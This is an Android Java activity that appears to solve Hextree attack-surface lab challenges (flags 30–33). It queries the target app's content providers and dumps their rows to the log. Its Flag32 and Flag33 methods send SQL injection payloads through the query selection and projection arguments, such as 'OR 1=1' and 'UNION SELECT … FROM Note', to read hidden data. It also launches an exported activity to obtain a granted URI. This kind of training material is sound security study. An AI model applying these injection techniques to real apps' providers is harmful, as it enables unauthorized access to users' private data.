package com.bedo.poc_app;

import android.app.ComponentCaller;
import android.content.Intent;
import android.database.Cursor;
import android.database.DatabaseUtils;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class Content_Provider_Labs extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_content_provider_labs);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });


        reviceUriandGetFlag33_2();
    }

    public void Flag30(View view) {

        Cursor cursor = getContentResolver().query(Uri.parse("content://io.hextree.flag30/success"),null,null,null,null);
        if(cursor !=null){
            while (cursor.moveToNext()){
                Log.d("provider_Dump", DatabaseUtils.dumpCurrentRowToString(cursor));

            }
        }else
            Log.d("provider_Dump", "Failed to get cursor.");
    }

    public void Flag31(View view) {
        Cursor cursor = getContentResolver().query(Uri.parse("content://io.hextree.flag31/flag/31"),null,null,null,null);
        if(cursor !=null){
            while (cursor.moveToNext()){
                Log.d("provider_Dump", DatabaseUtils.dumpCurrentRowToString(cursor));
            }
        }else
            Log.d("provider_Dump", "Failed to get cursor.");
    }

    public void Flag32(View view) {
        String[] Projection = new String[]{" * from Flag;-- -"};
        String selection1 = "1) UNION SELECT * FROM Flag where visible=0 AND(1";
        String selection2 = "1) OR 1=1-- -";
        // Use Selection or projection Payloads
        Cursor cursor = getContentResolver().query(Uri.parse("content://io.hextree.flag32/flags"),null,selection2,null,null);
        if(cursor !=null){
            while (cursor.moveToNext()){
                Log.d("provider_Dump", DatabaseUtils.dumpCurrentRowToString(cursor));
            }
        }else
            Log.d("provider_Dump", "Failed to get cursor.");
    }

    public void Flag33_1(View view) {

        Intent intent = new Intent("io.hextree.FLAG33").setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag33Activity1"
        );

        startActivityForResult(intent,1001);


    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if(requestCode == 1001 && data != null){
            Uri uri = data.getData();
            Log.d( "Uri: ", String.valueOf(uri));
            String[] Projection = new String[]{" * from Note;-- -"};
            String Selection = "1=1 UNION SELECT title,content,1,1 FROM Note -- -";

            Cursor cursor = getContentResolver().query(uri,Projection,null,null,null);
            if(cursor !=null){
                while (cursor.moveToNext()){
                    Log.d("provider_Dump", DatabaseUtils.dumpCurrentRowToString(cursor));
                }
            }else
                Log.d("provider_Dump", "Failed to get cursor.");
        }

    }

    public void reviceUriandGetFlag33_2(){
        Intent intent = getIntent();
        Uri uri = intent.getData();
        if(uri != null){
        Log.d("provider_Dump", String.valueOf(uri));
        String[] Projection = new String[]{" * from Note;-- -"};
        String Selection = "1=1 UNION SELECT 1,1,title,content FROM Note -- -";
        Cursor cursor = getContentResolver().query(uri,null,Selection,null,null);
        if(cursor !=null){
            while (cursor.moveToNext()){
                Log.d("provider_Dump", DatabaseUtils.dumpCurrentRowToString(cursor));
            }
        }else
            Log.d("provider_Dump", "Failed to get cursor.");
        }
    }



}